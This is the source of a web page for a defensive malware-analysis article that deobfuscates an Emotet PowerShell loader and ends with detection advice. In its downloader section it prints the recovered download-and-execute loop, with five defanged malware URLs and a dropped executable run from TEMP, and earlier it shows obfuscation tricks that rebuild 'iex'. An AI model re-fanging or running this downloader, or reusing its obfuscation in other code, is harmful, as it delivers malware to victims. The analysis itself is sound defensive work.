import type { Metadata } from "next";
import { ArticleLayout, Figure, Note } from "../components/ArticleLayout";

export const metadata: Metadata = {
  title: "Unpacking an Obfuscated Emotet PowerShell Loader",
  description:
    "A sample-led analysis of PowerShell format-string obfuscation, dynamic invocation, Base64 decoding, raw DEFLATE, and a recovered Emotet downloader.",
  alternates: { canonical: "/reverse-engineering-emotet.html" },
};

const contents = [
  { href: "#scope", label: "Scope and safety" },
  { href: "#shape", label: "Reading the outer layer" },
  { href: "#normalize", label: "Normalizing PowerShell" },
  { href: "#decode", label: "Base64 and DEFLATE" },
  { href: "#downloader", label: "The recovered downloader" },
  { href: "#detections", label: "Detection opportunities" },
  { href: "#conclusion", label: "What the sample proves" },
];

const references = [
  {
    href: "https://github.com/thewhiteninja/deobshell/",
    label: "DeobShell",
    detail: "PowerShell deobfuscation tooling used to normalize syntax and expressions.",
  },
  {
    href: "https://gchq.github.io/CyberChef/",
    label: "CyberChef",
    detail: "Used here for transparent Base64 decoding and raw DEFLATE decompression.",
  },
  {
    href: "https://learn.microsoft.com/en-us/dotnet/api/system.io.compression.deflatestream",
    label: ".NET DeflateStream documentation",
    detail: "The decompression primitive invoked by the sample.",
  },
  {
    href: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-280a",
    label: "CISA AA20-280A: Emotet Malware",
    detail: "Historical defensive context for Emotet delivery, behavior, and mitigations.",
  },
];

export default function EmotetPowerShell() {
  return (
    <ArticleLayout
      index="03"
      category="PowerShell analysis"
      title="Unpacking an obfuscated Emotet PowerShell loader"
      dek="This sample looks chaotic because it spends most of its effort constructing a small amount of ordinary PowerShell. Once each transformation is handled in order, the behavior resolves into a compact download-and-execute loop."
      revised="July 2026"
      readTime="15 minutes"
      contents={contents}
      references={references}
    >
      <section id="scope">
        <h2>Scope and safety</h2>
        <p>
          This is a static, sample-led analysis. The domains are historical and are
          defanged below, but they should still be treated as malicious artifacts.
          Do not paste the original script into an interactive PowerShell session.
          Work on a copy, preserve hashes at each stage, and perform transformations
          with tools that do not evaluate the recovered code.
        </p>
        <p>
          The old version of this note described the technique as “AST
          obfuscation.” That was imprecise. The sample uses PowerShell syntax,
          format-string reordering, mixed case, dynamic command construction,
          replacement operations, Base64, and compression. An abstract syntax tree
          is useful for analyzing and normalizing those expressions; it is not the
          hidden payload.
        </p>
      </section>

      <section id="shape">
        <h2>Reading the outer layer</h2>
        <p>
          At first glance the loader is a wall of reordered string fragments. The
          outer layer has three jobs:
        </p>
        <ol>
          <li>construct the .NET <code>Environment</code> type without writing its name normally;</li>
          <li>construct <code>iex</code>, the PowerShell alias for <code>Invoke-Expression</code>;</li>
          <li>reassemble a command that Base64-decodes and decompresses the inner script before evaluating it.</li>
        </ol>
        <Figure
          src="https://i.imgur.com/rP5GeXT.png"
          alt="Obfuscated PowerShell loader opened in a code editor"
          caption="Figure 1. The original outer layer. The visual noise is mostly string construction and reordering."
        />
        <p>
          Two small expressions reveal the approach. The first uses PowerShell’s
          format operator to reorder fragments:
        </p>
        <pre><code>{`[type]("{2}{1}{0}{3}" -f 'NM', 'O', 'eNvIR', 'ent')

# Format indexes 2,1,0,3 produce:
# eNvIR + O + NM + ent  →  eNvIRONMENT  →  Environment`}</code></pre>
        <p>The second derives the command that executes the recovered text:</p>
        <pre><code>{`([string]$VerbosePreference)[1,3] + 'x' -join ''

# With the normal value "SilentlyContinue":
# index 1 = i, index 3 = e, then x  →  iex`}</code></pre>
        <Note>
          <p>
            Do not replace <code>iex</code> with its expanded form and run the
            script. Replace the execution point with a write-to-file or inspection
            step inside an isolated analysis workflow.
          </p>
        </Note>
      </section>

      <section id="normalize">
        <h2>Normalizing the PowerShell</h2>
        <p>
          DeobShell is useful for turning format operations and dynamically built
          expressions into something readable. The important analytical habit is
          to review each simplification. Automated output is a hypothesis about
          what the source evaluates to, not a reason to stop reading the source.
        </p>
        <Figure
          src="https://i.imgur.com/DSLoYsm.png"
          alt="DeobShell output showing a normalized PowerShell expression"
          caption="Figure 2. Normalization exposes the Base64 and decompression chain without executing the inner payload."
        />
        <p>Reduced to its functional core, the outer layer is equivalent to:</p>
        <pre><code>{`$encoded = "<Base64 data>"
$bytes = [Convert]::FromBase64String($encoded)
$stream = New-Object IO.MemoryStream(,$bytes)
$deflate = New-Object IO.Compression.DeflateStream(
    $stream,
    [IO.Compression.CompressionMode]::Decompress
)
$reader = New-Object IO.StreamReader($deflate, [Text.Encoding]::ASCII)
$innerScript = $reader.ReadToEnd()

# The original passes $innerScript to Invoke-Expression.
# Analysis should save or print it instead.`}</code></pre>
      </section>

      <section id="decode">
        <h2>Base64 and raw DEFLATE</h2>
        <p>
          Base64 is an encoding, not encryption. Decoding it produces compressed
          bytes, not readable PowerShell. The call to .NET
          <code>DeflateStream</code> tells us what the next operation must be. In
          CyberChef, the reproducible recipe is:
        </p>
        <ol>
          <li><strong>From Base64</strong></li>
          <li><strong>Raw Inflate</strong></li>
          <li><strong>Decode text as ASCII</strong>, matching the sample</li>
        </ol>
        <Figure
          src="https://i.imgur.com/2s996rx.png"
          alt="CyberChef output displaying the decompressed PowerShell downloader"
          caption="Figure 3. Base64 decoding followed by raw Inflate recovers the inner downloader."
        />
        <p>
          “Raw” matters. A gzip recipe expects a gzip header and footer that this
          byte stream does not contain. The sample itself identifies the correct
          container through the API it calls.
        </p>
      </section>

      <section id="downloader">
        <h2>The recovered downloader</h2>
        <p>
          Once decompressed, the behavior is direct. The sample creates a
          <code>Net.WebClient</code>, splits a list of five URLs, writes the first
          successful response to <code>%TEMP%\378.exe</code>, executes it with
          <code>Invoke-Item</code>, and stops trying additional locations.
        </p>
        <pre><code>{`$client = New-Object Net.WebClient
$sources = @(
  'hxxp://cine80[.]co[.]kr/wvw/qhKE5rlkR',
  'hxxp://listyourhomes[.]ca/o5qDsWBe',
  'hxxp://hire-van[.]com/6dusyh9w3',
  'hxxp://icxturkey[.]com/nE2YMAjUK',
  'hxxp://spolarich[.]com/vlJ2o3k2h7'
)
$target = "$env:TEMP\\378.exe"

foreach ($source in $sources) {
  try {
    $client.DownloadFile($source, $target)
    Invoke-Item $target
    break
  } catch { }
}`}</code></pre>
        <table className="ioc-table">
          <thead><tr><th>Code</th><th>Observed behavior</th><th>Analytical value</th></tr></thead>
          <tbody>
            <tr><td><code>Net.WebClient</code></td><td>HTTP file retrieval</td><td>Useful with PowerShell script-block, module, AMSI, and network telemetry</td></tr>
            <tr><td>Five source URLs</td><td>Sequential fallback</td><td>Infrastructure set from the sample; historical status must be checked separately</td></tr>
            <tr><td><code>%TEMP%\378.exe</code></td><td>Fixed destination path</td><td>File creation and execution join on the affected host</td></tr>
            <tr><td><code>Invoke-Item</code></td><td>Executes the downloaded file</td><td>Links the script stage to process creation</td></tr>
            <tr><td>Empty <code>catch</code></td><td>Suppresses failed downloads</td><td>Explains repeated connection attempts without visible error output</td></tr>
          </tbody>
        </table>
        <p>
          The snippet does <strong>not</strong> establish persistence, steal
          credentials, or prove what <code>378.exe</code> does. Those behaviors may
          exist in the next stage, but they cannot be attributed to this script
          without acquiring and analyzing that payload.
        </p>
      </section>

      <section id="detections">
        <h2>Detection opportunities</h2>
        <p>
          The strongest detections join multiple stages. Any one of the following
          may occur legitimately; the sequence is much harder to dismiss:
        </p>
        <ol>
          <li>PowerShell evaluates a script with heavy format-string construction and dynamic invocation.</li>
          <li>The process decodes Base64 data and instantiates a <code>DeflateStream</code>.</li>
          <li><code>Net.WebClient.DownloadFile</code> writes an executable into a user-writable temporary directory.</li>
          <li>PowerShell or its child process executes that newly written file.</li>
          <li>The host contacts several unrelated domains until one request succeeds.</li>
        </ol>
        <h3>Data worth retaining</h3>
        <ul>
          <li>PowerShell script-block and module logging, with the applicable privacy and retention controls.</li>
          <li>AMSI or EDR content before and after deobfuscation.</li>
          <li>Process creation with parent, command line, user, integrity level, and hash.</li>
          <li>File creation and execution from temporary directories.</li>
          <li>Process-attributed DNS and network connections.</li>
        </ul>
      </section>

      <section id="conclusion">
        <h2>What the sample proves</h2>
        <p>
          The sample proves a delivery chain: obfuscated PowerShell reconstructs an
          execution primitive, decodes and decompresses a second script, then tries
          several locations until it can download and execute a Windows binary.
          It also gives defenders stable analytical joins across script, network,
          file, and process telemetry.
        </p>
        <p>
          The analysis becomes clearer when each layer is treated as a discrete
          transformation. There is no need to describe every string fragment as an
          advanced technique. Most of the script is camouflage around a small,
          testable downloader.
        </p>
      </section>
    </ArticleLayout>
  );
}
